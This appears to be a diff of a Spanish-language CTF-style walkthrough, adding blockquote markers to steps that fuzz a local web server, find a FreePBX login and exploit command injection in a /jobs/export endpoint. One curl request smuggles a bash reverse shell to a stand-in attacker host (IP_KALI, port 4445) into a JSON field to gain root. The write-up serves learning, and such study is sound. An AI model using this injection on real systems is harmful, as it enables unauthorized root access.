@@ -340,7 +340,7 @@ Ahora necesitamos saber las rutas que podemos usar. Antes vimos algunas con el r
 >ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://127.0.0.1:8080/FUZZ -fc 404
 >
 >admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 101ms]
-server-status           [Status: 200, Size: 20398, Words: 479, Lines: 331, Duration: 39ms]
+>server-status           [Status: 200, Size: 20398, Words: 479, Lines: 331, Duration: 39ms]
 >```
 
 Una vez que conocemos la ruta `/admin/` podemos acceder a ella: `http://127.0.0.1:8080/admin/`. En este enlace encontraremos un panel de `login` de la herramienta ***FreePBX***.
@@ -464,15 +464,15 @@ Vemos que podemos hacer una petición ***HTTP POST*** al *endpoint* `/jobs/expor
 >
 >```JSON
 >{
-  "command": "tar czf /var/automation/exports/prueba.tgz /var/automation/data 2>&1",
-  "output": "tar: Removing leading `/' from member names\n"
-}
+>  "command": "tar czf /var/automation/exports/prueba.tgz /var/automation/data 2>&1",
+>  "output": "tar: Removing leading `/' from member names\n"
+>}
 >```
 >
 >Ahora sabemos que esta petición ejecuta el comando del sistema `tar`, por lo que puede ser que sea, al igual que el *endpoint* `/status`, vulnerable a ***command injection***:
 >
 >```bash
-curl -s http://127.0.0.1:9000/jobs/export -H "Authorization: Bearer [hidden]" -H "Content-Type: application/json" -d '{"report":"prueba ; /bin/bash -c \"/bin/bash -i >& /dev/tcp/IP_KALI/4445 0>&1\" #"}'
+>curl -s http://127.0.0.1:9000/jobs/export -H "Authorization: Bearer [hidden]" -H "Content-Type: application/json" -d '{"report":"prueba ; /bin/bash -c \"/bin/bash -i >& /dev/tcp/IP_KALI/4445 0>&1\" #"}'
 >```
 >
 >Con este comando estamos creando una nueva reverse shell (*esta vez por el puerto `4445`*), por lo que tan solo tendremos que levantar el *listener* en nuestra máquina con el comando `nc -lvnp 4445` y obtendremos una reverse shell como `root`.
